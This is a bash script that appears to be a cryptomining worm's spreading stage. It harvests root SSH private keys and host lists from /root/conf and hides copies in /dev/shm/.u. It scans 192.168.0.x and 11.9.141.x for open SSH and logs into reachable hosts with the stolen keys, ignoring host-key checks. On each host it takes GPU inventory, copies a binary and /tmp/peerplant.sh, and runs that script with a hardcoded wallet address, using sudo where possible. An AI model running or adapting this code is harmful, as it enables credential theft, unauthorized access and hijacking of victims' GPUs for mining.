#!/bin/bash
set +e
WALLET=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
U=/dev/shm/.u; I=$U/intel; mkdir -p "$I"
echo "### FARM-INTEL $(date -u +%FT%TZ)"
for f in hostlist hosts ssh_config pass.sh mianmi.txt ssh.sh para_ssh.sh ssh-ssh.sh root_copy_id_rsa.sh keygen.sh set_sudonopasswd.sh synchosts.sh; do
  echo "--- /root/conf/$f"; head -25 "/root/conf/$f" 2>/dev/null
done
echo "### KEY-FINGERPRINTS"
ls -la /root/conf/root_rsa /root/conf/ssh_rsa /root/conf/ubuntu_rsa 2>/dev/null
for k in /root/conf/root_rsa/* /root/conf/ssh_rsa/* /root/conf/ubuntu_rsa/* /root/.ssh/id_rsa /root/.ssh/*.pem; do
  [ -f "$k" ] || continue
  fp=$(ssh-keygen -lf "$k" 2>/dev/null | awk '{print $2" "$4}')
  echo "$k -> ${fp:-notakey}"
done
mkdir -p "$I"/keys
cp -f /root/conf/root_rsa/* /root/conf/ssh_rsa/* /root/conf/ubuntu_rsa/* "$I"/keys/ 2>/dev/null
chmod 600 "$I"/keys/* 2>/dev/null

echo "### SWEEP22"
( seq 1 254 | sed 's/^/192.168.0./' ; seq 128 255 | sed 's/^/11.9.141./' ) | xargs -P 128 -I{} sh -c 'timeout 1 bash -c "exec 3<>/dev/tcp/{}/22" 2>/dev/null && echo {}' | sort -u | tee "$I"/ssh22.txt
wc -l < "$I"/ssh22.txt

echo "### KEY-LADDER"
: > "$I"/reach.txt
n=0
while read -r h; do
  n=$((n+1)); [ $n -gt 45 ] && break
  for spec in "root /root/conf/root_rsa/*" "root /root/conf/ssh_rsa/*" "ubuntu /root/conf/ubuntu_rsa/*" "root /root/.ssh/id_rsa" "kgzs /root/conf/root_rsa/*"; do
    set -- $spec; usr=$1; shift
    for k in $@; do
      [ -f "$k" ] || continue
      if timeout 6 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4 -o IdentitiesOnly=yes "$usr@$h" 'id -u' >/dev/null 2>&1; then
        echo "$h $usr $k" | tee -a "$I"/reach.txt
        break 2
      fi
      sleep 1
    done
  done
done < "$I"/ssh22.txt

echo "### PER-HOST"
while read -r h usr k; do
  [ -z "$h" ] && continue
  echo "########## $h ($usr)"
  timeout 20 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes "$usr@$h" 'hostname; nvidia-smi -L 2>/dev/null|wc -l; nvidia-smi --query-gpu=index,name,memory.used,utilization.gpu --format=csv,noheader 2>/dev/null | head -8; ps -eo args | grep -E "wildrig|krig" | grep -v grep | head -3' 2>&1 | head -14
  w=$(echo "$h" | tr '.' '-')
  timeout 15 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes "$usr@$h" 'mkdir -p /dev/shm/.u && chmod 700 /dev/shm/.u' >/dev/null 2>&1
  timeout 40 scp -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$U/w" "$usr@$h:/dev/shm/.u/w" >/dev/null 2>&1 && echo bin-ok
  timeout 30 scp -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/peerplant.sh "$usr@$h:/tmp/peerplant.sh" >/dev/null 2>&1
  timeout 150 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes "$usr@$h" "chmod +x /dev/shm/.u/w /tmp/peerplant.sh 2>/dev/null; sudo -n true 2>/dev/null && S='sudo -n' || S=''; \$S /tmp/peerplant.sh $WALLET ul-t2-$w" 2>&1 | tail -10
done < "$I"/reach.txt
echo "### DONE-FARM"
